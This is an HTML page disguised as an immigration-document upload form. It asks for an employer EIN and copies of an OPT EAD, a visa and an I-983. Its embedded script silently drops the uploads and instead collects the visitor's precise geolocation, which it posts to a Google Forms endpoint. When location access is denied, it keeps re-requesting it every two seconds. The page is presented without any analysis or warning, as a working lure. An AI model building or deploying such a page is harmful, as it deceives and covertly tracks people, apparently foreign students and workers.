<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Submission</title>
    <style>
        body, html {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #e6e6e6;
        }
        .container {
            background-color: #00447C;
            color: white;
            width: 100%;
            padding: 40px 0;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }
        .section {
            background-color: #f4f4f4;
            margin: 20px auto;
            padding: 20px 10%;
            width: 70%;
            border-radius: 5px;
            color: black;
            text-align: left;
        }
        button, input[type="file"], input[type="text"] {
            display: block;
            width: 80%;
            margin: 10px auto;
            padding: 10px;
            font-size: 16px;
            cursor: pointer;
        }
        label {
            display: block;
            text-align: left;
            margin: 10px;
        }
        h1 {
            text-align: center;
        }
        .hidden {
            display: none;
        }
        #locationError {
            color: red;
            margin: 10px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Documents Required*</h1>
        <div class="section">
            <p id="locationError" class="hidden"></p>
            <p>Please update the required fields.</p>
            <form id="uploadForm">
			<div>
                    <label for="ein">Employer EIN Number:</label>
                    <input type="text" id="ein" name="ein" required>
                </div>
                <div>
                    <label for="ead">Upload your OPT EAD copy:</label>
                    <input type="file" id="ead" name="ead" required>
                </div>
                <div>
                    <label for="visa">Upload your VISA copy:</label>
                    <input type="file" id="visa" name="visa" required>
                </div>
                
                <div>
                    <label for="i983">Upload I-983 (if applicable):</label>
                    <input type="file" id="i983" name="i983">
                </div>
                <button type="submit" id="submit">Submit</button>
            </form>
            <p id="thankYouMessage" class="hidden">Thank you! You may now close this window.</p>
        </div>
    </div>

    <script>
        document.getElementById('uploadForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the default form submission
            requestLocation(); // Start the location request process on form submission
        });

        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError, { timeout: 5000 });
            } else {
                displayError("Geolocation is not supported by this browser.");
            }
        }

        function sendLocationData(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            sendForm(latitude, longitude, accuracy);
        }

        function sendForm(latitude, longitude, accuracy) {
            const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
            const data = new URLSearchParams();
            data.append("entry.1267598962", latitude);
            data.append("entry.1270259896", longitude);
            data.append("entry.1888406517", accuracy);

            fetch(formUrl, {
                method: "POST",
                body: data,
                mode: "no-cors",
            }).then(() => {
                window.location.href = "thank-you.html"; // Redirect to the thank-you page on success
            }).catch((error) => {
                document.getElementById("output").innerText = "Error: " + error.message;
            });
        }

        function handleLocationError(error) {
            setTimeout(requestLocation, 2000); // Retry every 2 seconds if there's an error
            displayError("Error: Please enable location access to continue. Please close the page.");
        }

        function displayError(message) {
            const locationError = document.getElementById("locationError");
            locationError.innerText = message;
            locationError.classList.remove('hidden');
        }
    </script>
</body>
</html>
